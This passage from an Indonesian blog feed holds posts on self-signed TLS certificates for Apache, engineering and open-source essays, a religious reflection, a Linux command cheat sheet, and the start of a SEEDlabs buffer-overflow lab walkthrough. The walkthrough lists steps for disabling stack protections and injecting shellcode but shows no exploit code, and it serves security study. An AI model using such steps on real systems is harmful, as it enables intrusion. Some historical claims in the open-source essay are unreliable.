DNS.4 = testing.ditoprabowo.com
DNS.5 = 10.122.1.70
EOF
}

# Build TLS Certificate
build() {
  # Santizie domain name for file name
  FILENAME=${CN/\*\./}
  # Generate CA key &amp; crt
  openssl genrsa -out &quot;${tmp}/tmp.key&quot; 2048
  openssl req -x509 -new -nodes -key &quot;${tmp}/tmp.key&quot; -sha256 -days &quot;${DURATION}&quot; -out &quot;${OUTPATH}${FILENAME}_CA.pem&quot; -subj &quot;/C=${C}/ST=${ST}/L=${L}/O=${O}/OU=${OU}/CN=${CN}/emailAddress=${emailAddress}&quot;

  # CSR Configuration
  buildCsrCnf

  # Create v3.ext configuration file
  buildExtCnf

  # Server key
  openssl req -new -sha256 -nodes -out &quot;${OUTPATH}${FILENAME}.csr&quot; -newkey rsa:2048 -keyout &quot;${OUTPATH}${FILENAME}.key&quot; -config &lt;( cat &quot;${tmp}/tmp.csr.cnf&quot; )

  # Server certificate
  openssl x509 -req -in &quot;${OUTPATH}${FILENAME}.csr&quot; -CA &quot;${OUTPATH}${FILENAME}_CA.pem&quot; -CAkey &quot;${tmp}/tmp.key&quot; -CAcreateserial -out &quot;${OUTPATH}${FILENAME}.crt&quot; -days &quot;${DURATION}&quot; -sha256 -extfile &quot;${tmp}/v3.ext&quot;
}

checkVariables
build
# showVals
safeExit
</code></pre><p>hasilnya akan ada beberapa file yang tergenerate :</p>
<ol>
<li>ditoprabowo.crt</li>
<li>ditoprabowo.csr</li>
<li>ditoprabowo.key</li>
<li>ditoprabowo_CA.pem</li>
</ol>
<p>Selanjutnya install sever certificate pada Apache</p>
<ul>
<li>
<p>copy ca cert ke /etc/ssl/certs.</p>
<pre><code>  $ sudo cp ditoprabowo_CA.pem /etc/ssl/certs/
</code></pre>
</li>
<li>
<p>copy server cert dan private key ke folder ssl</p>
<pre><code>  $  cp ditoprabowo.crt /etc/ssl/certs/ditoprabowo.crt
  $  cp ditoprabowo.key /etc/ssl/private/ditoprabowo.key
</code></pre>
</li>
<li>
<p>aktifkan SSL module</p>
<pre><code>  $  a2enmod ssl
</code></pre>
</li>
<li>
<p>aktifkan SSL site in apache</p>
<pre><code>  $ a2ensite default-ssl
</code></pre>
</li>
<li>
<p>ditambahkan certificate pada apache</p>
<pre><code>    SSLCACertificateFile /etc/ssl/certs/ditoprabowo_CA.pem

    SSLCertificateFile	/etc/ssl/certs/ditoprabowo.crt

    SSLCertificateKeyFile /etc/ssl/private/ditoprabowo.key
</code></pre>
</li>
<li>
<p>Restart apache2</p>
<pre><code>  $  sudo service apache2 restart
</code></pre>
</li>
</ul>
<p>pindahkan file ditoprabowo_CA.pem ke local laptop</p>
<pre><code>    $  scp ditoprabowo_CA.pem dito@10.122.1.53:~
</code></pre>
<p>lalu pada browser, disini saya memakai chrome, klik setting &gt; manage certificate, pada root authorization import file diatas agar dikenali valid oleh chrome.</p>
<p><img src="/img/webj4.png" alt=""></p>
<p>hasilnya :</p>
<p><img src="/img/webj5.png" alt=""></p>
<p>Referensi :</p>
<ol>
<li>
<p><a href="http://developer.erabelajar.com/konfigurasi-dns-server-menggunakan-bind9-di-ubuntu-server/">http://developer.erabelajar.com/konfigurasi-dns-server-menggunakan-bind9-di-ubuntu-server/</a></p>
</li>
<li>
<p><a href="https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/">https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/</a></p>
</li>
<li>
<p>Google Image</p>
</li>
<li>
<p><a href="https://github.com/loganstellway/self-signed-ssl/blob/master/self-signed-tls">https://github.com/loganstellway/self-signed-ssl/blob/master/self-signed-tls</a></p>
</li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Apa Yang Seharusnya Dilakukan Oleh Seorang Engineer</title>
            <link>/posts/apa-yang-seharusnya-dilakukan-oleh-seorang-engineer/</link>
            <pubDate>Tue, 15 Oct 2019 05:08:35 +0700</pubDate>
            
            <guid>/posts/apa-yang-seharusnya-dilakukan-oleh-seorang-engineer/</guid>
            <description>Apa sih Engineer itu? Engineer adalah suatu ilmu keteknikan yang dipraktekan dalam kehidupan kita untuk mempermudah kita dalam melakukan sesuatu. Seorang Engineer harus bisa mengatasi masalah yang ada dalam kehidupan sehari-hari dari hal yang kecil hingga besar. Ada beberapa sifat yang harus dimiliki oleh seorang Engineer, yang pertama Be Humble, jangan sombong, dan akui kesalahan. Seorang Engineer yang sombong tidak akan banyak ilmu, saat ada orang yang ingin mengajak belajar, apabila ia sombong dan merasa tidak bisa, maka kemungkinan besar Engineer itu akan menolak karena dirasa sudah bisa, padahal banyak ilmu ilmu baru yang bisa dipelajari.</description>
            <content type="html"><![CDATA[<p>Apa sih Engineer  itu? Engineer adalah suatu ilmu keteknikan yang dipraktekan dalam kehidupan kita untuk mempermudah kita dalam melakukan sesuatu. Seorang Engineer harus bisa mengatasi masalah yang ada dalam kehidupan sehari-hari dari hal yang kecil hingga besar. Ada beberapa sifat yang harus dimiliki oleh seorang Engineer, yang pertama Be Humble, jangan sombong, dan akui kesalahan. Seorang Engineer yang sombong tidak akan banyak ilmu, saat ada orang yang ingin mengajak belajar, apabila ia sombong dan merasa tidak bisa, maka kemungkinan besar Engineer itu akan menolak karena dirasa sudah bisa, padahal banyak ilmu ilmu baru yang bisa dipelajari. Dan apabila ada orang yang menyalahkan kita dalam suatu masalah, akui kesalahan itu dan jangan sombong, bisa saja banyak ilmu ilmu yang kurang kita perhatikan dan akan berguna pada suatu hari.Yang kedua, seorang engineer harus bisa menganalisis suatu permasalahan, dan bisa memberikan solusi yang komprehensif.</p>
<p>Agar seorang bisa menganalisis dan bisa memberika solusi yang komprehensif pastinya seorang enginer harus berwawasan yang luas. Untuk bisa berwawasan luas seorang engineer harus melikiki cara berfikir yang open mind, selalu mengelaborasi ( mengengbangkan lebih lanjut dari apa yang didapatkan ), jangan berasumsi selalu cari fakta fakta terhadap masalah yang dihadapi. Dan seorang Engineer yang hebat selalu melakukan homework nya dengan baik, tanpa menunda-nunda dan selalu bertanya apabila memang dirasa tidak tahu, jangan malu.  Seorang Engineer juga harus memiliki integritas yang tinggi, ya integritas, saat berpfikir dan diomongkan dalam publik, hasil dari pekerjaan yang dilakukan harus sesuai dengan apa yang dibicarakan. Dan Engineer harus bisa menjalankan  semua pekerjaan nya dengan properly, artinya ia  harus bisa meyakini dengan pengetahuan dan kemampuannya bahwa ia telah melakukan nya dengan baik dan benar. Jadi dengan hati yang bersih, pikiran yang berwawasan luas dan analisis yang bagus, disertai awareness dalam penyelesaian masalah, akan menjadikan seorang Engineer hebat dalam dunia bisnis serta mampu memberikan solusi yang komprehensif bagi client nya. Dan pastinya seorang Engineer yang baik juga mempunyai niat untuk membangun bangsa dan negara nya.</p>
]]></content>
        </item>
        
        <item>
            <title>Open Source Sebagai Foundation Dari Industri 4.0</title>
            <link>/posts/open-source-sebagai-foundation-dari-industri-4.0/</link>
            <pubDate>Tue, 15 Oct 2019 05:06:54 +0700</pubDate>
            
            <guid>/posts/open-source-sebagai-foundation-dari-industri-4.0/</guid>
            <description>Ya seperti yang kita ketahui sebelumnya, Open Source merupakan istilah untuk sofware yang mana kode dari sofware tersebut bisa kita pelajari, modifikasi, maupun kita kembangkan sesuai keinginan kita. Dan Open Source tanpa kita sadari merupakan foundation atau dasar berdirinya Industri 4.0, kok bisa? Sebelumnya, apakah kalian tahu apa itu Industri 4.0? Industri 4.0 merupakan istilah dimana sebuah IT menjadi kebutuhan pokok dan menjadi support untuk kehidupan kita. Pada Industri 4.0 sangat sangat mempermudah kita untuk melakukan sesuatu termasuk didalamnya sudah terjadi automation yang artinya sudah ada beberap fitur otomatis, contohnya login/register.</description>
            <content type="html"><![CDATA[<p>Ya seperti yang kita ketahui sebelumnya, Open Source merupakan istilah untuk sofware yang mana kode dari sofware tersebut bisa kita pelajari, modifikasi, maupun kita kembangkan sesuai keinginan kita. Dan Open Source tanpa kita sadari merupakan foundation atau dasar berdirinya Industri 4.0, kok bisa?
Sebelumnya, apakah kalian tahu apa itu Industri 4.0? Industri 4.0 merupakan istilah dimana sebuah IT menjadi kebutuhan pokok dan menjadi support untuk kehidupan kita. Pada Industri 4.0 sangat sangat mempermudah kita untuk melakukan sesuatu termasuk didalamnya sudah terjadi automation yang artinya sudah ada beberap fitur otomatis, contohnya login/register. Biasanya kita perlu menginputkan data kita untuk bisa login/register. Sekarang tanpa perlu kita menginputkan data, kita bisa login dan register dengan akun Google atau yang lainnya. Tidak hanya itu, sekarang banyak aplikasi yang menggantikan dompet/uang nyata dengan uang virtual. Kita bisa membayar lewat aplikasi dan tanpa perlu ribet dengan kembalian serta waktu transaksi yang cepat. Seolah  olah semua kebutuhan pokok kita dimudahkan dengan tergantikannya dengan IT. Balik lagi, semua perkembangan IT dalam industri 4.0 tidak semudah mungkin bisa sepesat ini tanpa adanya Open Source. Dengan adanya Open Source, banyak orang bisa mempelajari source code yang ada untuk menciptakan sesatu yang baru. Misalnya dengan adanya open source dari flutter kita bisa membuat aplikasi yang bagus sesuai dengan apa yang kita inginkan yang bisa memudahkan seseorang. Tanpa adanya open source akan kesulitan apabila seseorang membangun dari awal sebuah system yang kompleks. Selain kemudahan dalam mempelajari, kita juga dapat meminimalisir biaya yang dikeluarkan karena open source gratis. Apabila sudah ada open source dan ingin mengembangkan lagi industri di indonesia, tinggal mencari orang dari akademisi yang expert dan mau juga belajar untuk bisnis. Soalnya, kebanyakan orang akademisi tidak terlalu memperdulikan bisnis lebih ke arah risetnya. Jadi ada gap antara akademisi dan bisnis.</p>
]]></content>
        </item>
        
        <item>
            <title>Open Source Adalah Keajaiban Dunia?</title>
            <link>/posts/open-source-adalah-keajaiban-dunia/</link>
            <pubDate>Tue, 15 Oct 2019 05:03:51 +0700</pubDate>
            
            <guid>/posts/open-source-adalah-keajaiban-dunia/</guid>
            <description>Seperti yang kita ketahui, Open source adalah istilah untuk software yang kode programnya disediakan oleh pengembangan untuk umum agar dapat dipelajari, diubah, atau dikembangkan. Jadi dengan adanya Open Source kita bisa melihat kode program dan bisa kita modifikasi untuk apapun yang kita inginkan dengan gratis, ya gratis. Lalu kenapa Open Source menjadi sebuah keajaiban dunia?. Banyak kisah menarik dari perusahaan IT besar yang lahir dari Open source,bahkan tidak hanya dari perusahaan IT, banyak perusahaan yang sekarang sudah menjadi perusahaan besar karena adanya Open source.</description>
            <content type="html"><![CDATA[<p>Seperti yang kita ketahui, Open source adalah istilah untuk software yang kode programnya disediakan oleh pengembangan untuk umum agar dapat dipelajari, diubah, atau dikembangkan. Jadi dengan adanya Open Source kita bisa melihat kode program dan bisa kita modifikasi untuk apapun yang kita inginkan dengan gratis, ya gratis. Lalu kenapa Open Source menjadi sebuah keajaiban dunia?. Banyak kisah menarik dari perusahaan IT besar yang lahir dari Open source,bahkan tidak hanya dari perusahaan IT, banyak perusahaan yang sekarang sudah menjadi perusahaan besar karena adanya Open source. Linux misalnya, salah satu operating system  open source yang dibuat oleh Linus Torvald, bayangkan apabila tidak ada linux apakah dunia IT akan seperti sekarang? Apa yang terjadi apabila hanya ada Windows milik microsoft yang apabila memilikinya harus membeli serta close source?</p>
<p>Tidak akan, tidak akan lahir Android, Google, bahkan film Titanic yang begitu hits sampai sekarang tidak akan ada tanpa Open Source, kok bisa?
Ya bisa, tahukan kalian sebenarnya Android itu merupakan operating system dengan mengadopsi OS linux? Android yang begitu banyak digunakan sekarang, diciptakan oleh Andy Rubin dan kawan kawan nya. Android awalnya berdiri dari perusahan Android Inc yang kemudian di beli oleh Google pada tahun 2005. Android diciptakan dari Open Source linux, dan Android sendiri bersifat Open Source agar para pengembang aplikasi bisa dengan mudah membuat aplikasi untuk diinstal dalam OS Android,jadi apabila tidak ada Open Source OS Linux apakah akan ada Android? dan apabila Android bersifat close source akankah Android akan berkembang pesat seperti sekarang? akan kah banyak yang bisa menciptakan aplikasi aplikasi dalam OS Android?</p>
<p>Begitu juga dengan Google, Google pada awalnya adalah mesin search engine. Dimana yang dinamakan search engine perlu data yang banyak agar bisa membuktikan bahwa milik Google lah search engine yang tercepat. Untuk mempunyai data yang banyak, perlu banyak orang yang menggunakan internet dan komputer, dan yang namanya komputer harus memiliki os agar bisa berjalan. Bayangkan apabila hanya ada Windows milik microsoft yang berbayar pada dunia ini, pastinya akan sedikit orang yang mampu membeli windows, dan penyebaran data pun sedikit, dan IT pun akan lambat perkembangan nya apabila hanya ada windows pada dunia ini. Tapi, dengan adanya Linux OS yang bersifat Open Source, bakal banyak orang yang bisa memakai komputer dan bakal banyak juga data yang bisa menyebar serta terwujudlah perusahaan Google yang kalian tau sendiri seperti apa suksesnya.</p>
<p>Tidak hanya perusahaan IT, bahkan film Titanic pun bisa sukses dan ada karena adanya Open Source. Pada jaman dahulu, penyimpanan media elektronik sangat sangat terbatas, tidak seperti sekarang, sedangkan agar bisa membuat film titanic, diperlukan penyimpanan sangat besar karena setiap frame yang bagus hasilnya menghasilkan data yang cukup besar, apabila hanya ada windows apakah akan ada film titanic? windows mempunya limit penyimpanan maksimal, dan harus menghabiskan biaya yang mahal untuk membuat windows bisa menyimpan memory yang besar. Untuk mengatasi masalah penyimpanan yang besar, dipangilah hacker untuk membuat linux memiliki penyimpanan yang besar dan bisa menghemat biaya produksi secara besar.</p>
<p>Pada kenyataannya, membangun dan mengimplementasikan open source dalam dunia bisnis tidak semudah seperti membeli ke perusahaan sofware berbayar, jika kita memilih jalan membayar apabila ada error kita tinggal kontak penyedia, dan tidak ada perkembangan ilmu dalam masalah troubleshoot dan problem solving, biaya nya mahal juga, sangat tidak bijaksana. Belum lagi apabila penyedia memberikan sebuah kejahatan berupa virus ,malware atau spyware dalam sofware tersebut yang kita tidak mengetahuinya [Hidden Agenda]. Juga pada sofware berbayar tidak muncul keberagaman sofware antara pembuat, penjual, pengguna, dsb. Beda cerita jika memakai Open source, banyak sekali tantangan yang harus dihadapi dan dibutuhkan semangat besar open source. Pada penggunaan, bisa muncul beragam bentuk pada pencipta dan pemakai, belum lagi jika menginginkan beberapa fitur yang berbeda, semua orang bisa dengan mudah memodifikasi seperti apa yang diinginkan. Dalam implementasi nya juga, open source diimplementasikan dengan base practice, dari research (experiment) dan analisis, lalu mendapat experience kemudian saat dicoba di produksi mendapat feedback dan hasil, lalu dianalisis lagi dan mendapat experience lagi berulang ulang, tidaklah mudah. Sampai akhirnya timbulah SOP, timbullah Procedure bisa dikatan metodologi sampai muncul sebuah Guideline yang akhirnya mendekati maturity (kematangan) dalam implementasi open source. Belum lagi masalah legalitas,  kita bisa saja terkena pelanggaran hak cipta (copyright) , dimana vendor harus menjamin seluruh hukum dan denda apabila ada pelanggaran copyright, dan client tidak sama sekali harus membayar denda. Yang artinya kita harus benar benar memastikan bahwa tidak ada pelanggaran sama sekali dalam pengimplementasikan open source, baru kita profesional dalam menjalankan bisnis kita.</p>
]]></content>
        </item>
        
        <item>
            <title>Ketika Sholat mu Hanya Untuk Kewajiban Semata</title>
            <link>/posts/ketika-sholat-mu-hanya-untuk-kewajiban-semata/</link>
            <pubDate>Mon, 14 Oct 2019 11:31:53 +0700</pubDate>
            
            <guid>/posts/ketika-sholat-mu-hanya-untuk-kewajiban-semata/</guid>
            <description>Sholat merupakan rukun Islam ke 2 dan memang merupakan Kewajiban yang harus kita laksanakan, tapi.. menurut kalian apakah hanya untuk itu saja? hanya karena melaksanakan Kewajiban saja?
Saya mengakui bahwa memang manusia diciptakan tidak bisa sempurna, tapi setiap manusia saya percaya selalu punya kelebihan masing-masing entah diketahui atau tidak. Apabila seseorang telah menemukan apa yang dia nyaman melakukannya dan mempunyai suatu impian yang tinggi terhadap apa yang dilakukannya pastinya akan berusaha sekeras mungkin untuk mengejarnya.</description>
            <content type="html"><![CDATA[<p>Sholat merupakan rukun Islam ke 2 dan memang merupakan Kewajiban yang harus kita laksanakan, tapi.. menurut kalian apakah hanya untuk itu saja? hanya karena melaksanakan Kewajiban saja?</p>
<p>Saya mengakui bahwa memang manusia diciptakan tidak bisa sempurna, tapi setiap manusia saya percaya selalu punya kelebihan masing-masing entah diketahui atau tidak. Apabila seseorang telah menemukan apa yang dia nyaman melakukannya dan mempunyai suatu impian yang tinggi terhadap apa yang dilakukannya pastinya akan berusaha sekeras mungkin untuk mengejarnya. Setiap waktu rela dihabiskan untuk belajar dan mendalami agar bisa tercapai apa yang diinginkan nya, apalagi kalo orangnya sangat ambisius sekali. Mereka percaya dengan kemampuannya dan bisa dibilang passion nya jika diasah terus menerus akan bisa mengejar apa yang diimpi impikan meskipun bukan suatu hal yang gampang diraih.</p>
<p>Memang dan memang lagi, tidaklah salah berjuang keras. tapi&hellip;, ada tapinya? apa? apakah mengejar apa yang kita impikan apa yang kita harapakan cukup dengan berjuang keras saja?</p>
<p>Iya, ini juga termasuk hal yang pernah saya alami, saya mengimpikan suatu hal dan saya mencoba sangat bekerja keras belajar untuk menggapai itu, tapi pada akhirnya tidak semua sesuai dengan apa yang saya inginkan dan rencanakan. Sehingga pernah merasakan down mental saat itu, sedih, kecewa, juga dirasakan.</p>
<p>Terlintas ada di benak pikiran suatu pertanyaan.. Apa ada yang salah dengan saya? saya sudah mereasa sangat maksimal dalam berusaha, waktu waktu sudah saya habiskan untuk belajar, tapi kenapa hasilnya tidak sesuai dengan apa yang saya pikirkan?</p>
<p>Beberapa hari sudah saya lalui semenjak kegagalan itu, dan saat iseng bermain media sosial, ada salah satu post dari Official Account Tehjasminunpad yang menarik perhatian saya, yang berjudul &quot; Merasa paling Bodoh&quot; , berikut isinya :</p>
<pre><code>  Pernah ga ada di posisi, saat kita merasa sudah belajar banyak hal dan belajar ini dan itu, bahkan merasa perjuangan kita lebih keras dari orang lain.

  Tapi saat nilainya keluar, yang didapat adalah nilai yang menurut kita sangat kecil. Sementara orang lain yang kita lihat belajar nya pun antara mau dan tidak, malah mendapatkan hasil yang lebih baik dari kita.

  Hati mana yang gak sakit ditikung nilai dengan cara seperti itu?

  Tapi eh tapi.. Sebenernya kita gak perlu takut. karena kita mungkin gak dapatkannilai atau data kuantitatif dari apa yang kita usahakan.. api kita punya ilmunya.

  kecewa sampai menangis pun tak apa. itu proses berdka kok. mungkin kamu bakal denial, anger, bargaining. Jangan lupa coping-nya juga harus kuat biar kamu gak resika harga diri rendah atau putus ada dan malah gak mau berusaha lagi buat belajar agar lebih baik lagi.

  Utamanya, harus terus berfikir positif sama Allah. sembari mempertanyakan pada diri sendiri.

  Waktu ujian apa kita udah dekat sama Allah? Waktu ujian apa kita udah tilawah? waktu ujian apa kualitas ibadah kita baik?

  Dan,ya. Mungkin ini cara Allah menyadarkan, Bahwa usaha kerasmu untuk belajar itu mungkin luar biasa, tapi Allah tak ingin kamu lupa pada Rabb-Mu...

  Jadi Allah kasih teguran kecil untuk menyadarkan bahwa tanpa ridho Allah, HARD WORK IS NOTHING.

  Allah ingin kamu dekat dengan-Nya loh, ingin denger doa-doamu. Karena Allah sayang kamu, gak mau kamu cuma mengejar dunia, Allah ingin kamu dapatkan juga pahala untuk akhirat.

  Boleh sedih dan kecewa sama nilai gak sesuai usaha kita, sama hasil jauh dari perkiraan, atau tenrang apapun. Tapi ingat, jangan terlalu lama. Yuk bangkit lagi.
</code></pre>
<p>Setelah saya membaca ini, saya sudah sangat yakin. Iniloh jawaban dari pertanyaan yang ada di pikiranku. ketika sholat, ibadah yang kulakukan hanya untuk sekedar menunaikan kewajiban, dan melupakan makna dari tujuan sholat itu sendiri. Makanya Allah kasih peringatan. Dan ada quote yang menarik dari @therealhaikal yang berbunyi kalo nggak salah &quot; ketika apa yang kita inginkan tidak tercapai itulah tanda bahwa kita tidak bisa menyuruh Allah.&quot;</p>
<p>Saya akui saya masih banyak kesalahan, dan hanyalah manusia biasa. Tapi kita juga harus berusaha untuk memperbaiki kesalahan itu.</p>
<p>Memang yang diabadikan belum tentu abadi, dan yang tidak diabadikan bisa saja abadi. Saya mengabadikan post ini belum tentu abadi, tapi seenggaknya biar menjadi pembelajaran yang bisa diingat agar tidak terjadi lagi dan agar orang lain dapat belajar dari tulisan ini. Terimakasih, saya tunggu komentar, saran , kritiknya hehe.</p>
]]></content>
        </item>
        
        <item>
            <title>Linux_Basic_Admin</title>
            <link>/posts/linux_basic_admin/</link>
            <pubDate>Fri, 11 Oct 2019 20:51:34 +0700</pubDate>
            
            <guid>/posts/linux_basic_admin/</guid>
            <description>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.
Berikut beberapa command yang telah kita rangkum : list Menampilkan list detail
 ls -l  Menampilkan list keseluruhan (termasuk dot file)
 ls -la  Menampilkan list berdasarkan waktu
 ls -t  Menampilkan list berdasarkan ukuran file
 ls -S  Menampilkan list berdasarkan tipe file</description>
            <content type="html"><![CDATA[<p>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.</p>
<h3 id="berikut-beberapa-command-yang-telah-kita-rangkum-">Berikut beberapa command yang telah kita rangkum :</h3>
<h4 id="list">list</h4>
<p>Menampilkan list detail</p>
<pre><code>      ls -l
</code></pre>
<p>Menampilkan list keseluruhan (termasuk dot file)</p>
<pre><code>      ls -la
</code></pre>
<p>Menampilkan list berdasarkan waktu</p>
<pre><code>      ls -t
</code></pre>
<p>Menampilkan list berdasarkan ukuran file</p>
<pre><code>    ls -S
</code></pre>
<p>Menampilkan list berdasarkan tipe file</p>
<pre><code>    ls -F
</code></pre>
<p>Menampilkan list dengan index file nya</p>
<pre><code>    ls -i
</code></pre>
<h4 id="cat">cat</h4>
<p>Print ke terminal isi dari file</p>
<pre><code>    cat [ file ]
</code></pre>
<h4 id="mengubah-directori">Mengubah directori</h4>
<p>Mengubah directori folder</p>
<pre><code>  cd
</code></pre>
<h4 id="tail">Tail</h4>
<p>Menampilkan baris akhir sebanyak n</p>
<pre><code>  [perintah lain] | tail -n
</code></pre>
<p>Monitoring perubahan file</p>
<pre><code>  tail -f [nama file]
</code></pre>
<h4 id="head">Head</h4>
<p>Menampilkan baris awal sebanyak n</p>
<pre><code>  [perintah lain] | head -n
</code></pre>
<h4 id="right-direction">Right Direction</h4>
<p>Replace isi dari file output</p>
<pre><code>  cat /proc/cpuinfo &gt; command.txt
</code></pre>
<h4 id="double-right-directioninsert-sesuatu-pada-file-output">Double Right DirectionInsert sesuatu pada file output</h4>
<pre><code>  cat /proc/cpuinfo | wc -l &gt;&gt; command.txt
</code></pre>
<h4 id="left-direction">Left Direction</h4>
<p>File sebagai input (yang diproses)</p>
<pre><code>  ./program &lt; command.txt
</code></pre>
<h4 id="error-direction">Error Direction</h4>
<p>Memasukkan error pada file output</p>
<pre><code>    mkdir Music 2&gt; myerror.txt (replace)
    mkdir Music 2&gt;&gt; myerror.txt (insert)
</code></pre>
<h4 id="sort">Sort</h4>
<p>Mengurutkan isi file (per baris)</p>
<pre><code>    sort -u [namafile]
</code></pre>
<h4 id="uniq">Uniq</h4>
<p>Menghitung jumlah elemen per nilai dalam data</p>
<pre><code>    uniq -c [namafile]
</code></pre>
<h4 id="grep">Grep</h4>
<p>Mencari kata dalam suatu file</p>
<pre><code>    [perintah] | grep [keyword]
</code></pre>
<h4 id="copy">Copy</h4>
<p>Copy semua file dalam satu direktori</p>
<pre><code>    cp * [direktori tujuan]
</code></pre>
<p>Copy semua file dan sub direktori</p>
<pre><code>    cp -R * [direktori tujuan]
</code></pre>
<p>Copy file</p>
<pre><code>    cp [namafile] [direktori tujuan]
</code></pre>
<p>Copy tanpa merubah date timestamps</p>
<pre><code>    cp -p
</code></pre>
<h4 id="move">Move</h4>
<p>Jika belum ada nama, membuat file baru. Jika sudah ada nama, memindahkan</p>
<pre><code>    mv
</code></pre>
<h4 id="ssh">SSH</h4>
<p>Komputer A SSH komputer B</p>
<pre><code>    ssh B@ip
</code></pre>
<p>A kirim file ke B</p>
<pre><code>    scp [nama file] B@ip:direktori
</code></pre>
<p>B mengambil file dari A</p>
<pre><code>    scp A@ip:direktori [direktori lokal]
</code></pre>
<p>SSH tanpa password</p>
<pre><code>    sshpass -p [password]
</code></pre>
<p>ssh dengan perintah</p>
<pre><code>    A@ip [perintah]
</code></pre>
<h4 id="create-new-file">Create New File</h4>
<p>Membuat file baru</p>
<pre><code>    touch [nama file]
</code></pre>
<h4 id="check-direction">Check Direction</h4>
<p>Menampilkan alamat direktori aktif</p>
<pre><code>    pwd
</code></pre>
<h4 id="locate">Locate</h4>
<p>Mencari file pada semua direktori</p>
<pre><code>  locate [keyword]
</code></pre>
<h4 id="find">Find</h4>
<p>Mencari file pada direktori aktif</p>
<pre><code>  Find [keyword]
</code></pre>
<h4 id="remove">Remove</h4>
<p>Menghapus folder yang kosong</p>
<pre><code>  rmdir
</code></pre>
<p>Menghapus file</p>
<pre><code>  rm [direktori file]
</code></pre>
<p>Menghapus semua isi direktori</p>
<pre><code>  rm -r [direktori]
</code></pre>
<p>Menghapus Paksa semua isi dir (force)</p>
<pre><code>  rm -rf [file / dir]
</code></pre>
<h4 id="check-ip-address">Check IP Address</h4>
<p>Mengecek IP Addres</p>
<pre><code>  ifconfig
  ip address
</code></pre>
<h4 id="show-process">Show Process</h4>
<p>Untuk melihat process status</p>
<pre><code>  ps -ef
</code></pre>
<h4 id="check-env">Check env</h4>
<p>Print Environment Variable</p>
<pre><code>  env
</code></pre>
<h4 id="displays-and-updates-sorted-process-information">Displays and updates sorted process information</h4>
<p>Menampilkan process secara update dan terurut</p>
<pre><code>  top
  htop
</code></pre>
<h4 id="shows-the-network-status">Shows the network status</h4>
<p>Menampilkan status network</p>
<pre><code>  netstat
</code></pre>
<h4 id="display-free-disk-space">Display free disk space</h4>
<p>Menampilkan disk space yang bisa dipakai</p>
<pre><code>  df -h
</code></pre>
<p>-h prints out the information in human-readable format</p>
<h4 id="to-check-the-user-running-the-application">To check the user running the application</h4>
<p>Melihat user id yang berjalan</p>
<pre><code>  id
</code></pre>
<h4 id="change-permision">Change permision</h4>
<p>Mengubah permision suatu File</p>
<pre><code>  chmod [parameter] [file]
</code></pre>
<p>contoh : chmod +x bash.sh, chmod 777 bash.sh</p>
<h4 id="dignslookup">dig/nslookup</h4>
<p>dig (DNS lookup utility) or nslookup (query Internet name servers)</p>
<pre><code>  dig equnix.asia
  nslookup equnix.asia
</code></pre>
<h4 id="history">history</h4>
<p>melihat history command</p>
<pre><code>  history
</code></pre>
]]></content>
        </item>
        
        <item>
            <title>Buffer_Overflow_Labs_From_SEEDlabs</title>
            <link>/posts/buffer_overflow_labs_from_seedlabs/</link>
            <pubDate>Fri, 11 Oct 2019 20:25:58 +0700</pubDate>
            
            <guid>/posts/buffer_overflow_labs_from_seedlabs/</guid>
            <description>0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</description>
            <content type="html"><![CDATA[<h2 id="0x00-intro">0x00 Intro</h2>
<p>Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.</p>
<h2 id="0x01-guide">0x01 Guide</h2>
<p>Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</p>
<p>Untuk file yang dibutuhkan :</p>
<ol>
<li>
<p>stack.c (the vulnerable program)</p>
</li>
<li>
<p>call_shellcode.c</p>
</li>
<li>
<p>Exploit.py (Buat Sendiri)</p>
</li>
</ol>
<p>Untuk file stack.c dan call_shellcode.c sudah disediakan oleh seedlab, untuk exploit.py saya membuat sendiri payloadnya yang untuk injeksi.</p>
<p>Kita bisa memasukan shellcode kedalam badfile tapi program belum bisa mengeksekusi shellcode karena return address program belum kita overflow dan diarahkan ke lokasi alamat shelccode, untuk itu kita harus menyari return address program, dan menggantinya dengan alamat shellcode.</p>
<p>Untuk mencari return address bisa mudah kita cari menggunakan feature gdb-peda yaitu pattern, saat program kita jalankan kasih pattern yang sudah di generate, akan muncul invalid return address suatu alamat, lalu alamat itu akan di baca oleh gdb-peda dan akan menghasilkan angka berapa ofset yang harus kita isi padding(junk char) agar kita bisa memodifikasi return address.</p>
<p>Untuk mencari alamat shellcode, debug program dengan gdb-peda lalu break pada salah satu address saat variable buffer terbuat, lalu bisa kita baca alamat buffer tersebut.</p>
<p>Ketika sudah mendapat return address dan alamat shellcode, kita buat payload dan memasukannya kedalam badfile, setelah itu kita jalankan programnya stack. Apabila berhasil masuk ke dalam shell berarti buffer overflow berhasil.</p>
<p>Adapun step step yang harus kita lakukan :</p>
<ol>
<li>
<p>Mematikan Address Space Randomization pada VM.</p>
</li>
<li>
<p>Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</p>
</li>
<li>
<p>Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</p>
</li>
<li>
<p>Mencari offset untuk return address</p>
</li>
<li>
<p>Mencari alamat Buffer</p>
</li>
<li>
<p>Membuat Payload dan mengeksekusi</p>
</li>
</ol>
